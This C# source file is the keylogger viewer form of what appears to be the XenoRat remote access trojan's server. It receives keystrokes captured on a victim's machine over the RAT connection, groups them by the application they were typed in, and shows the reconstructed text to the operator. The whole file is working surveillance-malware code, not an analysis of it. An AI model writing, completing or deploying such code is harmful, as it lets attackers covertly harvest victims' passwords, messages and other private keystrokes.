using System;
using System.Collections.Generic;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace XenoRatServer.Forms
{
    public partial class KeyLogger : Form
    {
        private readonly Node client;
        private readonly Dictionary<string, string> applications = new Dictionary<string, string>();

        public KeyLogger(Node client)
        {
            this.client = client;
            InitializeComponent();
            Task.Run(ReceiveDataAsync);
        }

        private async Task ReceiveDataAsync()
        {
            while (client.Connected())
            {
                try
                {
                    byte[] applicationBytes = await client.ReceiveAsync();
                    byte[] keyBytes = await client.ReceiveAsync();

                    if (applicationBytes == null || keyBytes == null)
                    {
                        if (!IsDisposed)
                        {
                            Invoke((MethodInvoker)Close);
                        }
                        break;
                    }

                    string application = Encoding.UTF8.GetString(applicationBytes);
                    string key = Encoding.UTF8.GetString(keyBytes);

                    if (string.IsNullOrEmpty(key))
                        continue;

                    if (!applications.ContainsKey(application))
                    {
                        listView1.Items.Add(application);
                        applications[application] = "";
                    }

                    applications[application] += key;

                    if (selectedItem == application)
                    {
                        textBox1.Text = Normalize(applications[selectedItem]);
                    }
                }
                catch { }
            }
        }

        private void listView1_ItemActivate(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                selectedItem = listView1.SelectedItems[0].Text;
                textBox1.Text = Normalize(applications[selectedItem]);
            }
        }

        private string Normalize(string input)
        {
            return input.Replace("[enter]", Environment.NewLine).Replace("[space]", " ");
        }

        // Generated event handlers
        private void textBox1_TextChanged(object sender, EventArgs e) { }

        private void listView1_SelectedIndexChanged(object sender, EventArgs e) { }

        private void KeyLogger_Load(object sender, EventArgs e) { }

        private void label1_Click(object sender, EventArgs e) { }

        private void label2_Click(object sender, EventArgs e) { }

        private void textBox1_TextChanged_1(object sender, EventArgs e) { }
    }
}
